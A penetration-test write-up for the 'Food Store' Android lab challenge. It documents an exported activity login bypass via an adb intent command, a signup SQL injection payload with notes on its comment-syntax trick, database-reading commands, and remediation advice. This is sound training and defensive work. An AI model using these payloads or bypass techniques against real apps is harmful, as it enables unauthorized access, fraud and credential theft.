# Mobile App Pentest — `com.mobilehackinglab.foodstore` ("Food Store")

**Target:** `com.mobilehackinglab.foodstore.apk` — Mobile Hacking Lab "Food Store" challenge
**Platform:** Android (minSdk 27, targetSdk 34)
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** Both primary findings **dynamically confirmed on-device.** FS-01 (login bypass): a
single external `adb am start` with crafted extras opened the main screen as a Pro user with
arbitrary credits, no login. FS-02 (signup SQL injection): the injected username
`pwn', 'cHdu', 'eA==', 1)/*` planted a `users` row with `isPro=1`, after which logging in as the
planted `pwn` / `pwn` succeeded as a Pro user.

---

## Summary

Food Store is a simple food-ordering app: log in, and the main screen shows your **credits** and
**Pro/Regular** status, which gate ordering. All of the trust that should live behind the login is
instead carried **in the client**, in two places:

1. **`MainActivity` is `exported="true"`** and takes the user's identity, credit balance, and Pro
   flag straight from **intent extras** (`USERNAME`, `USER_CREDIT`, `IS_PRO_USER`, `USER_ADDRESS`).
   It never re-derives them from the authenticated session or the DB. So any app — or `adb` — can
   launch `MainActivity` directly with arbitrary extras, **skipping the login entirely** and
   granting itself unlimited credits and Pro status.
2. **Signup builds its `INSERT` by string concatenation** of the raw username, so a crafted username
   is **SQL injection** into the `users` table — e.g. registering yourself with `isPro = 1`.

Credentials at rest make it worse: passwords and addresses are stored only **Base64-encoded** (not
hashed/encrypted), and the app ships `debuggable="true"` + `allowBackup="true"`, so the whole user
DB — with trivially reversible passwords — is extractable off the device.

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| FS-01 | Broken access control / auth bypass — exported `MainActivity` trusts credit + Pro state from intent extras; launch it directly to skip login and grant unlimited credits / Pro — **confirmed on-device** | **High** | MASVS-AUTH-1 / MASVS-PLATFORM-1 |
| FS-02 | SQL injection in `DBHelper.addUser` — raw username concatenated into `INSERT` → self-provision `isPro=1` / tamper DB — **confirmed on-device** | **High** | MASVS-CODE-4 / MASVS-STORAGE-1 |
| FS-03 | Credentials stored reversibly — passwords (and addresses) only Base64-encoded in SQLite, not hashed | Medium | MASVS-STORAGE-1 / MASVS-CRYPTO-1 |
| FS-04 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| FS-05 | `android:allowBackup="true"` (user DB extractable via `adb backup`) | Medium | MASVS-STORAGE-2 |

---

## FS-01 — Exported activity trusts privilege from intent extras (the main bypass)

**Manifest** — `MainActivity` is exported with no permission and no intent filter:
```xml
<activity android:name="com.mobilehackinglab.foodstore.MainActivity" android:exported="true"/>
```

**The intended (trusted) flow** — `LoginActivity` validates the password, computes credit from the
DB's `isPro`, and passes everything to `MainActivity` as extras:
```java
int credit = user.isPro() ? 10000 : 100;
Intent intent = new Intent(this, MainActivity.class);
intent.putExtra("USERNAME", inputUsername);
intent.putExtra("USER_CREDIT", credit);
intent.putExtra("IS_PRO_USER", user.isPro());
intent.putExtra("USER_ADDRESS", user.getAddress());
startActivity(intent);
```

**The problem** — `MainActivity.onCreate()` reads those extras as the authoritative state; there is
no session, no re-check against the DB, no `getCallingActivity()` validation:
```java
this.userCredit = getIntent().getIntExtra("USER_CREDIT", 0);
boolean isProUser = getIntent().getBooleanExtra("IS_PRO_USER", false);
...
String stringExtra = getIntent().getStringExtra("USER_ADDRESS");
```
`userCredit` is exactly what gates purchases in `handleOrderClicked()`:
```java
if (this.userCredit >= price) { this.userCredit -= price; /* order placed */ }
else { /* "Insufficient credits ... contact the administrator." */ }
```

Because the activity is exported and trusts the caller's extras, **the login is just decoration** —
anyone can start `MainActivity` with whatever credit/Pro values they like.

### PoC (bypass login, unlimited credits + Pro)
```bash
adb shell am start -n com.mobilehackinglab.foodstore/.MainActivity \
    --es USERNAME attacker \
    --ei USER_CREDIT 999999 \
    --ez IS_PRO_USER true \
    --es USER_ADDRESS "1 Attacker St"
```
**Result (confirmed on-device):** the main screen opens with `Credits: 999999` and `Pro User`, and
every item is orderable — no account, no password, no payment. A malicious app does the same with an
explicit `Intent` naming the component. This is the core challenge objective (get Pro / credits
without "contacting the administrator") reached purely client-side.

---

## FS-02 — SQL injection in signup (`DBHelper.addUser`)

`addUser()` Base64-encodes the password and address, but splices the **raw username** into the SQL
string:
```java
String sql = "INSERT INTO users (username, password, address, isPro) VALUES ('"
           + Username + "', '" + encodedPassword + "', '" + encodedAddress + "', 0)";
db.execSQL(sql);
```
`Username` comes straight from the signup `EditText` with no escaping or parameterization, so a
username that closes the quote and the value list injects arbitrary column data. The hardcoded
`isPro = 0` is meant to stop self-upgrade — injection defeats it. (The password/address fields are
Base64 of user input, whose alphabet contains no `'`, so the username is the usable entry point;
the read path, `getUserByUsername`, is correctly parameterized with `?`.)

### PoC (register yourself as a Pro user)
Enter as the **username** on the signup screen:
```
pwn', 'cHdu', 'eA==', 1)/*
```
The statement becomes:
```sql
INSERT INTO users (username, password, address, isPro) VALUES ('pwn', 'cHdu', 'eA==', 1)/*', '<encPass>⏎', '<encAddr>⏎', 0)
```
→ a row with `username=pwn`, `password=cHdu` (Base64 "pwn"), `isPro=1`. **Log in as `pwn` / `pwn`**
(not with the payload string, and not with `cHdu` — the stored password is Base64-*decoded* before
the compare) and `LoginActivity` grants `credit = 10000` + Pro. Beyond self-upgrade, `execSQL` will
run other statement shapes, so the same hole allows corrupting or seeding arbitrary `users` rows.

> **Why `/*`, not `--`.** `addUser` encodes the password and address with `Base64.encodeToString(…, 0)`
> (`Base64.DEFAULT`), which **appends a trailing `\n`**. A SQLite `--` comment only runs to end of
> line, so it stops at that embedded newline and the leftover `', '<addr>\n', 0)` is a syntax error —
> `execSQL` throws, the (uncaught) exception kills the Signup activity, and you get bounced back to
> Login with **no success toast** (the tell-tale sign the INSERT failed). An unterminated `/*` block
> comment runs to end of input in SQLite, swallowing the newlines, so the statement parses cleanly.
> Also type a plain ASCII apostrophe — a keyboard "smart quote" `’` won't break out of the string.
> Confirm the stored row with
> `run-as com.mobilehackinglab.foodstore sqlite3 databases/userdatabase.db 'SELECT username,password,isPro FROM users'`.

---

## FS-03 — Reversible credential storage

`addUser` stores the password as `Base64.encodeToString(password.getBytes(), 0)` and
`getUserByUsername` simply `Base64.decode`s it back — Base64 is an **encoding, not a hash or
cipher**, so every stored password is recoverable in one step. The login compares the decoded value
to the input in plaintext. Addresses (PII) are stored the same way. Anyone who reads
`userdatabase.db` (see FS-04/FS-05) recovers all credentials instantly.

---

## FS-04 / FS-05 — Device-posture weaknesses
- **`debuggable="true"`** → `run-as com.mobilehackinglab.foodstore` on any device gives direct read
  of `databases/userdatabase.db`; combined with FS-03, every account's password falls out.
- **`allowBackup="true"`** (with `fullBackupContent`/`dataExtractionRules` present but backup still
  enabled) → `adb backup` can pull the app's SQLite DB off the device.

---

## Root cause & remediation
- **Enforce identity and entitlements on the trusted side, not in intent extras.** `MainActivity`
  should load the authenticated user's credit/Pro status from a session or the DB keyed by a
  verified identity — never from caller-supplied extras. Set `android:exported="false"` (it has no
  reason to be launchable externally), or require an authenticated session token it validates.
- **Parameterize every query.** Build the `INSERT` with bound arguments
  (`db.insert(...)` / `ContentValues`, or `execSQL(sql, new Object[]{...})`), exactly as the read
  path already does with `"username = ?"`. Never concatenate user input into SQL.
- **Store credentials properly.** Don't keep recoverable passwords at all — authenticate server-side
  and store only a salted password hash (Argon2/bcrypt/scrypt). If a secret must stay on-device, use
  the Android Keystore. Base64 provides zero confidentiality.
- Disable `debuggable` and `allowBackup` for release builds; scope backup rules to exclude the DB.

---

## Appendix — environment & method
- Tools: `unzip`, `jadx` (decompile + manifest decode). No native libs, assets, or network calls —
  the app is entirely local, so all logic/credentials live client-side.
- App classes: `LoginActivity` (launcher, exported; parameterized read, builds the privileged
  intent), `Signup` (not exported; the injectable `addUser` path), `MainActivity` (exported; trusts
  extras — FS-01), `DBHelper` (SQLite; FS-02 INSERT + FS-03 Base64), `User`/`FoodItems` data classes,
  `defpackage.FoodAdapter` (RecyclerView adapter, calls `handleOrderClicked`).
